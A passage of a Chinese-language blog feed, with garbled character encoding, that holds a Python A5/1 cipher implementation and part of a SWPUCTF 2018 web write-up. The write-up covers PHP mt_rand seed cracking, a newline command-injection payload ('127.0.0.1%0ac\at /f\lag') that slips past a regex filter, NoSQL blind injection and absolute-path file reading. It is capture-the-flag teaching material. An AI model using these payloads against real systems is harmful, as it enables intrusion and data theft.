class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2bin</span><span class="params">(str_mess)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str_mess:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        res += tmp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bin2str</span><span class="params">(bin_mess)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    tmp = re.findall(<span class="string">r'.&#123;8&#125;'</span>,bin_mess)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">        res += chr(int(i,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LFSRinit</span><span class="params">()</span>:</span> <span class="comment">#ç”¨64bitå¯†é’¥åˆå§‹3ä¸ªç§»ä½å¯„å­˜å™¨,åˆ†åˆ«æ˜¯19,22,23ä½</span></span><br><span class="line">    <span class="keyword">global</span> X</span><br><span class="line">    <span class="keyword">global</span> Y</span><br><span class="line">    <span class="keyword">global</span> Z</span><br><span class="line">    key = input(<span class="string">"è¯·è¾“å…¥8ä½ç§˜é’¥\n"</span>)</span><br><span class="line">    <span class="keyword">while</span> len(key) != <span class="number">8</span>:   <span class="comment">#é™å®šåªèƒ½æ˜¯8ä½ï¼Œç„¶åç”Ÿæˆ64ä½çš„äºŒè¿›åˆ¶æµ</span></span><br><span class="line">        key = input(<span class="string">"è¯·è¾“å…¥8ä½ç§˜é’¥\n"</span>)</span><br><span class="line">    key_bin_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">        key_bin_str += tmp</span><br><span class="line">    X = key_bin_str[<span class="number">0</span>:<span class="number">19</span>]</span><br><span class="line">    Y = key_bin_str[<span class="number">19</span>:<span class="number">41</span>]</span><br><span class="line">    Z = key_bin_str[<span class="number">41</span>:]</span><br><span class="line">    <span class="comment"># print("X"+X)</span></span><br><span class="line">    <span class="comment"># print("Y"+Y)</span></span><br><span class="line">    <span class="comment"># print("Z"+Z)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(bin_str,bin_key)</span>:</span> <span class="comment">#è¾“å…¥çš„å­—ç¬¦ä¸²çš„äºŒè¿›åˆ¶æµ</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_str)):</span><br><span class="line">        <span class="keyword">if</span> bin_str[i] == bin_key[i]:</span><br><span class="line">            res += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_key</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> X</span><br><span class="line">    <span class="keyword">global</span> Y</span><br><span class="line">    <span class="keyword">global</span> Z</span><br><span class="line">    LFSRinit()</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">114</span>):   <span class="comment"># A5 / 1ç”¨äºä¸ºæ¯ä¸ªçªå‘äº§ç”Ÿ114æ¯”ç‰¹çš„å¯†é’¥æµåºåˆ—</span></span><br><span class="line">        <span class="comment"># a = X[-1]</span></span><br><span class="line">        <span class="comment"># b = Y[-1]</span></span><br><span class="line">        <span class="comment"># c = Z[-1]</span></span><br><span class="line">        g  = int(X[<span class="number">-1</span>]) ^ int(Y[<span class="number">-1</span>]) ^ int(Z[<span class="number">-1</span>])</span><br><span class="line">        res += str(g)  <span class="comment">#ç”¨æœ€åä¸€ä½å¼‚æˆ–äº§ç”Ÿç§˜é’¥æµ</span></span><br><span class="line">        x =  str(int(X[<span class="number">13</span>]) ^  int(X[<span class="number">16</span>]) ^ int(X[<span class="number">17</span>]) ^ int(X[<span class="number">18</span>]) ^ <span class="number">1</span>)               <span class="comment">#å€™é€‰ä½çš„å€¼</span></span><br><span class="line">        y =  str(int(Y[<span class="number">20</span>]) ^ int(Y[<span class="number">21</span>]) ^ <span class="number">1</span>)</span><br><span class="line">        z = str(int(Z[<span class="number">7</span>]) ^ int(Z[<span class="number">20</span>]) ^ int(Z[<span class="number">21</span>]) ^ int(Z[<span class="number">22</span>]) ^ <span class="number">1</span>)</span><br><span class="line">        <span class="comment">#é€‰æ‹©çš„é’Ÿæ§ä½</span></span><br><span class="line">        c_x = int(X[<span class="number">8</span>])</span><br><span class="line">        c_y = int(Y[<span class="number">10</span>])</span><br><span class="line">        c_z = int(Z[<span class="number">10</span>])</span><br><span class="line">        <span class="keyword">if</span> (c_x + c_y + c_z) &gt;= <span class="number">2</span>:<span class="comment">#å¤šæ•°çš„å ä¼˜</span></span><br><span class="line">            choice = <span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            choice = <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">if</span> str(c_x) == choice:</span><br><span class="line">            X = x + X[:<span class="number">-1</span>] <span class="comment">#éšå¼ä½ç§»ï¼Œè¿™é‡Œæ˜¯ä¸åŒ…å«æœ€åä¸€ä½çš„</span></span><br><span class="line">        <span class="keyword">if</span> str(c_y) == choice:</span><br><span class="line">            Y = y + Y[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> str(c_z) == choice:</span><br><span class="line">            Z = z + Z[:<span class="number">-1</span>]</span><br><span class="line">        <span class="comment"># print("X"+X)</span></span><br><span class="line">        <span class="comment"># print("Y"+Y)</span></span><br><span class="line">        <span class="comment"># print("Z"+Z)</span></span><br><span class="line">    <span class="comment"># print(res)</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a5_encode</span><span class="params">(mess)</span>:</span></span><br><span class="line">    bin_mess = str2bin(mess)</span><br><span class="line">    bin_key = create_key()</span><br><span class="line">    bin_cipher = <span class="string">""</span></span><br><span class="line">    <span class="comment">#print(len(bin_mess))</span></span><br><span class="line">    <span class="keyword">if</span> len(bin_mess) % <span class="number">114</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_mess), <span class="number">114</span>):</span><br><span class="line">            bin_cipher += xor(bin_mess, bin_key)</span><br><span class="line">    <span class="keyword">elif</span> len(bin_mess) &gt; <span class="number">114</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">114</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">    print(<span class="string">"äºŒè¿›åˆ¶å¯†æ–‡"</span> + bin_cipher)</span><br><span class="line">    print(<span class="string">"åå…­è¿›åˆ¶å¯†æ–‡"</span>+hex(int(bin_cipher,<span class="number">2</span>)))</span><br><span class="line">    str_cipher = bin2str(bin_cipher)</span><br><span class="line">    print(base64.b64encode(str_cipher.encode(<span class="string">'utf-8'</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a5_decode</span><span class="params">(bin_mess)</span>:</span></span><br><span class="line">    bin_key = create_key()</span><br><span class="line">    bin_cipher = <span class="string">""</span></span><br><span class="line">    <span class="comment"># print(len(bin_mess))</span></span><br><span class="line">    <span class="keyword">if</span> len(bin_mess) % <span class="number">114</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_mess), <span class="number">114</span>):</span><br><span class="line">            bin_cipher += xor(bin_mess, bin_key)</span><br><span class="line">    <span class="keyword">elif</span> len(bin_mess) &gt; <span class="number">114</span>:</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> j == <span class="number">114</span>:</span><br><span class="line">                j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(bin_mess)):</span><br><span class="line">            bin_cipher += str(int(bin_mess[i]) ^ int(bin_key[i]))</span><br><span class="line">    str_cipher = bin2str(bin_cipher)</span><br><span class="line">    print(<span class="string">"è§£å¯†åçš„ç»“æœ:"</span>+str_cipher)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_info</span><span class="params">()</span>:</span></span><br><span class="line">    choice = input(<span class="string">"1.åŠ å¯†\n2.è§£å¯†\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">        message = input(<span class="string">"è¾“å…¥ä½ çš„ä¿¡æ¯\n"</span>)</span><br><span class="line">        a5_encode(message)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">        bin_message = input(<span class="string">"è¾“å…¥ä½ çš„ä¿¡æ¯\n"</span>)</span><br><span class="line">        a5_decode(bin_message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"è¯·é‡æ–°è¾“å…¥"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        get_info()</span><br></pre></td></tr></table></figure><h3 id="å®‰å…¨æ€§"><a href="#å®‰å…¨æ€§" class="headerlink" title="å®‰å…¨æ€§"></a>å®‰å…¨æ€§</h3><p>å…¶å®è¿™ä¸ªç®—æ³•çš„å…³é”®ç‚¹è¿˜æ˜¯è½åœ¨äº†ç§˜é’¥çš„é•¿åº¦ï¼Œä½“ç°åœ¨å…¶å¯„å­˜å™¨çš„é•¿åº¦ä¸Šï¼Œå¤ªçŸ­äº†ï¼Œæ‰€ä»¥ç°åœ¨å·²çŸ¥æ˜æ–‡æ”»å‡»æ³•å¯¹è¿™ä¸ªç®—æ³•çš„æ”»å‡»æ˜¯å…ˆç¡®å®šå…¶ä¸­ä¸¤ä¸ªå¯„å­˜å™¨çš„åˆå§‹å€¼å†è®¡ç®—å‡ºå¦å¤–ä¸€ä¸ªï¼Œæ‰€ä»¥è¦æƒ³æ”¹è¿›å°±æ˜¯é‡‡ç”¨æ›´é•¿çš„çº¿æ€§åé¦ˆå¯„å­˜å™¨äº†ã€‚ã€‚ã€‚ã€‚ã€‚</p>]]></content>
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>swpuctfèµ›åå¤ç°</title>
      <link href="/swpuctf-2018.html"/>
      <url>/swpuctf-2018.html</url>
      <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™ä¸ªæ¯”èµ›WebçœŸçš„å¾ˆæœ‰è´¨é‡ï¼Œå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿<a id="more"></a>ï¼Œå€¼å¾—çºªå½•ä¸€ä¸‹</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><h3 id="ç”¨ä¼˜æƒ ç -ä¹°ä¸ª-X"><a href="#ç”¨ä¼˜æƒ ç -ä¹°ä¸ª-X" class="headerlink" title="ç”¨ä¼˜æƒ ç   ä¹°ä¸ª X ?"></a>ç”¨ä¼˜æƒ ç   ä¹°ä¸ª X ?</h3><p>ä¸Šæ¥æœ¬èƒ½å…ˆæ³¨å†Œç™»å½•ä¸€æ³¢æŸ¥çœ‹æœ‰ä»€ä¹ˆåŠŸèƒ½ï¼Œå‘ç°æ³¨å†Œèµ é€çš„ä¼˜æƒ ç ä¸èµ·ä»»ä½•ä½œç”¨ï¼Œéœ€è¦çš„æ˜¯24ä½çš„æ³¨å†Œç (ä½†æ˜¯ç»™æˆ‘çš„åªæœ‰15ä½)ï¼Œè€Œä¸”å­˜åœ¨ä¸€ä¸ªexec.phpï¼Œä½†æ˜¯å¿…é¡»è¦ä½¿ç”¨è¿‡ä¼˜æƒ ç æ‰å¯ä»¥æ‰“å¼€ï¼Œæ€è·¯å¾ˆæ˜ç¡®åº”è¯¥æ˜¯è¦åˆ°è¿™ä¸ªé¡µé¢å»ï¼Œä½†å¾—ç»•è¿›å»ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å¸¸è§„çš„ä¿¡æ¯æç¤ºï¼Œå‘ç°æ²¡æœ‰æç¤ºåªå¥½æ‰«ä¸€æ³¢ç›®å½•ï¼Œå‘ç°æœ‰æºç </p><p><img src="https://s1.ax1x.com/2018/12/21/FsZBGt.png" alt="FsZBGt.png"></p><p>æŸ¥çœ‹ä¸€ä¸‹æºç å‘ç°äº†äº§ç”Ÿéšæœºä¼˜æƒ ç çš„çš„ä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ç”Ÿæˆä¼˜æƒ ç </span></span><br><span class="line">$_SESSION[<span class="string">'seed'</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">mt_srand($_SESSION[<span class="string">'seed'</span>]);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(<span class="string">'Auth'</span>, $auth);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯æ˜äº†ä¸ºä»€ä¹ˆè¿™é‡Œçš„ä¼˜æƒ ç åªæœ‰15ä½äº†ï¼Œå› ä¸ºä»–åå°å°±å·²ç»é™å®šäº†é•¿åº¦ä¸º15ï¼Œç„¶åé€šè¿‡ç°åœ¨å·²ç»å­˜åœ¨çš„ä»£ç åæ¨ï¼Œæ ¹æ®è¿™ç¯‡æ–‡ç« æ¨¡ä»¿ä¸€ä¸‹ï¼Œæ„é€ å‡ºä¸€éƒ¨åˆ†çš„éšæœºæ•°:<a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $str = <span class="string">"ZQ7hMEpfLtonAzK"</span>;</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $len=<span class="number">15</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">          &#123;</span><br><span class="line">              $pos = strpos($str_rand,$str[$i]);</span><br><span class="line">              <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($str_rand)<span class="number">-1</span>).<span class="string">" "</span>; </span><br><span class="line">          &#125;</span><br><span class="line">        <span class="comment">//æ•´ç†æˆæ–¹ä¾¿ php_mt_seed æµ‹è¯•çš„æ ¼å¼</span></span><br><span class="line">  <span class="comment">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è®°å¾—è¿™é‡Œä¸€å®šè¦ä»¥PHP 7.2è·‘ï¼Œä¸ç„¶è·‘å‡ºæ¥ä¸ä¸€æ ·çš„ã€‚ã€‚ã€‚ã€‚è¿™é‡Œæ¨å‡ºä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯ä¸å½±å“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">51 51 0 61 45 45 0 61 3 3 0 61 11 11 0 61 21 21 0 61 29 29 0 61 13 13 0 61 22 22 0 61</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsuotJ.png" alt="FsuotJ.png"></p><p>å¾ˆå¿«å°±å¯ä»¥è·‘å‡ºæ¥ï¼Œç„¶åå†æ‰‹åŠ¨æ’­ç§ï¼Œå¹¶ä¸”æ›´æ”¹é•¿åº¦ä¸º24ï¼Œè¾“å‡ºç§˜é’¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ç”Ÿæˆä¼˜æƒ ç </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">youhuima</span><span class="params">()</span></span>&#123;</span><br><span class="line">    mt_srand(<span class="number">323099333</span>);</span><br><span class="line">    $str_rand = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">    $auth=<span class="string">''</span>;</span><br><span class="line">    $len=<span class="number">24</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span>($i&lt;=($len/<span class="number">2</span>))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(<span class="number">0</span>, strlen($str_rand) - <span class="number">1</span>))*<span class="number">-1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $auth;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">youhuima();</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯ç»•è¿‡å‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†äº†ï¼Œæºä»£ç ä¹Ÿæœ‰ç»™å‡º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//support</span></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/^\d+\.\d+\.\d+\.\d+$/im"</span>,$ip))&#123;</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">"/\?|flag|&#125;|cat|echo|\*/i"</span>,$ip))&#123;</span><br><span class="line">               <span class="comment">//æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//flagå­—æ®µå’ŒæŸäº›å­—ç¬¦è¢«è¿‡æ»¤!</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// ä½ çš„è¾“å…¥ä¸æ­£ç¡®!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆæ˜¯é™åˆ¶äº†åªèƒ½ipåœ°å€ï¼Œä½†æ˜¯ä½¿ç”¨äº†mä¿®é¥°ç¬¦åå°±ä¸ä¸€æ ·äº†ï¼Œå¯ä»¥ç”¨<code>%0a</code>å»ç»•è¿‡ï¼ŒåŸå› æ˜¯åœ¨<code>^</code>ä»¥åŠ<code>$</code>ä¹‹é—´ä¼šåŒ¹é…æ¢è¡Œä¹‹å‰å’Œä¹‹åï¼Œåªè¦æ˜¯ä¸€ä¸ªæ­£ç¡®å°±ä¼šè¿”å›æ­£ç¡®å•¦ï¼Œç¬¬äºŒè½®çš„è¿‡æ»¤ï¼ŒæŠŠ<code>*</code>ï¼Œ<code>?</code>,<code>flag</code>ç»™ä½ è¿‡æ»¤äº†ï¼Œç»•è¿‡æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>\</code>å»ç»•è¿‡ï¼Œå®˜æ–¹é¢˜è§£ç”¨çš„å•å¼•å·å»ç»•è¿‡ï¼Œéƒ½ä¸€æ ·ã€‚ã€‚æœ€åå‘åŒ…å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1%0ac\at /f\lag</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/12/21/FsKX2n.png" alt="FsKX2n.png"></p><h3 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h3><p>è¿™ä¸ªé¢˜ç›®è€ƒçš„ç‚¹æ˜¯æ³¨å…¥ï¼Œåˆå­¦åˆ°äº†23333ï¼Œå…ˆæ˜¯æŸ¥çœ‹æºä»£ç å‘ç°å…ˆå­˜åœ¨info.phpï¼Œè¿›å»çœ‹çœ‹å‘ç°phpinfoçš„é¡µé¢</p><p><img src="https://s1.ax1x.com/2018/12/21/Fsdk79.png" alt="Fsdk79.png"></p><p><a href="https://imgchr.com/i/FsdEkR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/21/FsdEkR.md.png" alt="FsdEkR.md.png"></a></p><p>phpinfoé¡µé¢è¡¨æ˜äº†å¼€äº†mongoæ‰©å±•ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹NoSQLæ³¨å…¥ï¼Œè¿™é‡Œå®˜æ–¹ç»™çš„wpå¥½åƒæ˜¯æœ‰ä¸€ä¸ªå¯ä»¥å¸¦éªŒè¯ç è¯†åˆ«çš„pythonè„šæœ¬ï¼Œæœ‰ç©ºå¾—å­¦å­¦é‚£ä¸ªæ¨¡å—æ‰è¡Œ</p><p><img src="https://s1.ax1x.com/2018/12/21/FsdrAs.png" alt="FsdrAs.png"></p><p>å¦‚æœä¸æ­£ç¡®çš„è¯æ˜¾ç¤ºçš„æ˜¯ä¸Šæ–¹çš„æ ·å­ï¼Œæ­£ç¡®çš„è¯ä¼šæ˜¾ç¤ºä¸‹æ–¹çš„æ ·å­ï¼Œå¯ä»¥æ ¹æ®æ­¤æ¥ç›²æ³¨</p><p><img src="https://s1.ax1x.com/2018/12/21/FsdIE9.png" alt="FsdIE9.png"></p><p>æœ€åæ³¨å…¥çš„å¯†ç æ˜¯skmunï¼Œç”¨æˆ·æ˜¯adminï¼Œç™»å½•å°±å¯ä»¥è·å¾—flag</p><h3 id="çš‡å®¶çº¿ä¸ŠèµŒåœº"><a href="#çš‡å®¶çº¿ä¸ŠèµŒåœº" class="headerlink" title="çš‡å®¶çº¿ä¸ŠèµŒåœº"></a>çš‡å®¶çº¿ä¸ŠèµŒåœº</h3><p>å³é”®å¯ä»¥å‘ç°å­˜åœ¨sourceç›®å½•ï¼Œå¯ä»¥åœ¨é‡Œé¢æ‰¾åˆ°ä¸‹é¢çš„ä¸œè¥¿</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]# tree web</span><br><span class="line">web/</span><br><span class="line">â”œâ”€â”€ app</span><br><span class="line">â”‚   â”œâ”€â”€ forms.py</span><br><span class="line">â”‚   â”œâ”€â”€ __init__.py</span><br><span class="line">â”‚   â”œâ”€â”€ models.py</span><br><span class="line">â”‚   â”œâ”€â”€ static</span><br><span class="line">â”‚   â”œâ”€â”€ templates</span><br><span class="line">â”‚   â”œâ”€â”€ utils.py</span><br><span class="line">â”‚   â””â”€â”€ views.py</span><br><span class="line">â”œâ”€â”€ req.txt</span><br><span class="line">â”œâ”€â”€ run.py</span><br><span class="line">â”œâ”€â”€ server.log</span><br><span class="line">â”œâ”€â”€ start.sh</span><br><span class="line">â””â”€â”€ uwsgi.ini</span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line">    return abort(403)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure><p>ç„¶åå¯ä»¥åˆ©ç”¨è¿™ä¸ªç‚¹å»è¯»æ–‡ä»¶ï¼Œä½†æ˜¯é‡Œé¢ä¸å¯ä»¥åŒ…å«<code>..</code>ä¹Ÿå°±æ˜¯ä¸èƒ½ä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼Œåªèƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥è¯»å–æ–‡ä»¶</p><p><a href="https://imgchr.com/i/Fs0Mod" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/21/Fs0Mod.md.png" alt="Fs0Mod.md.png"></a></p><p>ç„¶åå°è¯•è¯»å–<code>/proc/self/mounts</code>å‘ç°é‡Œé¢å­˜åœ¨ä¸€ä¸ªwebç›®å½•ï¼Œå¦å¤–æˆ‘ä»¬çŸ¥é“<code>/proc/[pid]/cwd</code>æ˜¯è¿›ç¨‹å½“å‰å·¥ä½œç›®å½•çš„ç¬¦å·é“¾æ¥,å¯ä»¥ä»ä¸­è¯»å–æ–‡ä»¶å†…å®¹ï¼Œè¯»å–åˆ°äº†ä¸¤ä¸ªæ–‡ä»¶å†…å®¹</p><p><strong>init</strong>.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span 